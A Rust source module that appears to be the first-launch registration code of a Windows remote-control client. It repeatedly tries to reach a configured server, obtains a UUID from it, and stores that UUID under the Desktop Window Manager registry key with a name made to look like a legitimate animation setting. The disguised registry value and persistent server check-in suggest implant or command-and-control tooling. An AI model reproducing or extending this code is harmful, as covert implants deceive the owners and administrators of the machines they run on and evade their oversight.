#[path = "packet.rs"]
mod packet;
use packet::message_code::MessageCode::*;

use std::path::Path;
use winreg::{enums::HKEY_LOCAL_MACHINE, RegKey};

use tokio::io::AsyncWriteExt;
use tokio::net::TcpStream;

use crate::{CONNECTION_RETRY_DELAY, SERVER_ADDR};

async fn first_launch_setup() -> Result<(), Box<dyn std::error::Error>> {
    // Check if the program has been launched before

    // prepare key
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    // SOFTWARE\\Microsoft\\Windows\\Dwm"
    let path = Path::new("SOFTWARE")
        .join("Microsoft")
        .join("Windows")
        .join("Dwm");
    let (key, _) = match hklm.create_subkey(&path) {
        Ok(key) => key,
        Err(err) => {
            println!("{}", err);
            std::process::exit(2)
        }
    };

    // connects to server
    let mut stream = loop {
        match TcpStream::connect(SERVER_ADDR).await {
            Ok(stream) => break stream,
            Err(_) => {
                tokio::time::sleep(std::time::Duration::from_secs(CONNECTION_RETRY_DELAY)).await;
                continue;
            }
        }
    };
    // asks for uuid
    stream.writable().await?;
    let packet = packet::Packet::new(AskUuid, &[]);
    stream.write(&packet.to_bytes()).await?;

    // reads uuid
    stream.readable().await?;

    let packet = packet::Packet::from_stream(&mut stream).await;
    let uuid = match String::from_utf8(packet.buf.to_vec()) {
        Ok(uuid) => uuid,
        Err(_) => {
            println!("Failed to parse uuid");
            std::process::exit(4)
        }
    };
    // saves uuid in registry
    match key.set_value("AnimationSessionUuid", &uuid) {
        Ok(_) => {}
        Err(err) => {
            println!("{}", err);
            println!("Failed to save uuid in registry")
        }
    };

    stream.shutdown().await?;

    std::process::exit(0);
}

pub async fn initialisation() -> String {
    if std::env::consts::OS != "windows" {
        std::process::exit(1)
    }

    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let dwm = match hklm.open_subkey("SOFTWARE\\Microsoft\\Windows\\Dwm") {
        Ok(dwm) => dwm,
        Err(_) => {
            println!("Dwm not found");
            std::process::exit(3)
        }
    };
    let value: String = match dwm.get_value("AnimationSessionUuid") {
        Ok(value) => value,
        Err(_) => {
            first_launch_setup().await.unwrap();
            "".to_string()
        }
    };

    return value;
}
